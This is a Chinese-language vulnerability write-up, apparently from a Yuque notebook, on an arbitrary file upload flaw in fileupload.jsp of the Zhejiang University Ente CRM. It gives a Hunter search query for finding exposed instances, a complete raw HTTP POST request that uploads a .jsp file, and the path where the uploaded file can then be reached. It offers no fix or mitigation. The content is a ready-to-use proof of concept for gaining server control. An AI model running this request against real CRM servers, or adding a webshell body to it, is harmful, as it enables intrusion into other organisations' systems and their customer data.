# 浙大恩特CRM  fileupload.jsp 任意文件上传漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">浙大恩特CRM是由浙江大学恩智浙大科技有限公司推出的客户关系管理（CRM）系统。该系统旨在帮助企业高效管理客户关系，提升销售业绩，促进市场营销和客户服务的优化。系统支持客户数据分析和报表展示，帮助企业深度挖掘客户数据，提供决策参考。浙大恩特CRM fileupload.jsp存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器控制权限。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ <font style="color:rgba(0, 0, 0, 0.9);">浙大恩特CRM</font>

# <font style="color:rgba(0, 0, 0, 0.9);">三、资产测绘</font>
+ hunter`app.name="浙大恩特 CRM"`
+ 特征

![1700034640158-a0b751ed-9499-471d-aef1-96b75913aa5a.png](./img/MNKDc3hnljdTlvOE/1700034640158-a0b751ed-9499-471d-aef1-96b75913aa5a-154874.png)

# 四、漏洞复现
```plain
POST /entsoft_en/entereditor/jsp/fileupload.jsp?filename=123123.jsp HTTP/1.1
Host: xx.xx.xx.xx
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=2511BA8347F6BD511B037A4B0C40DDE3; JSESSIONID=17BAFD608E509D1C96AF5715B9C0C235
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 4

test
```

![1700146846618-56989d7b-0142-47ed-ba9c-3b4e5ce5728d.png](./img/MNKDc3hnljdTlvOE/1700146846618-56989d7b-0142-47ed-ba9c-3b4e5ce5728d-919392.png)

上传文件位置

```plain
	/enterdoc/uploadfile/123123.jsp
```

![1700146879660-7bc87d16-6df6-426a-ae19-fce2cb505006.png](./img/MNKDc3hnljdTlvOE/1700146879660-7bc87d16-6df6-426a-ae19-fce2cb505006-245853.png)



> 更新: 2024-02-29 23:55:45  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gpf53pls4igr823a>